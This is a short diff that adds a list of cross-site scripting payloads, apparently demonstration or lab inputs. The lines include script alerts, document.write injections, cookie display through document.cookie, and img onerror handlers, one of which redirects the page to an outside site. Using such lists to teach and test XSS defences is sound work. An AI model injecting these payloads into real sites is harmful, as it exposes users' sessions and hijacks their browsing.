@@ -1,0 +1,6 @@
+<a href="http://www.triveratech.com">View here !</a> 
+<script>alert("XSS")</script>
+<script>document.write("<b>Inject code here!</b>")</script>
+<script>document.write(document.cookie)</script>
+<img src="http://none" onerror="alert(document.cookie);">
+<img src="http://none" onerror=parent.location="http://www.triveratech.com";>
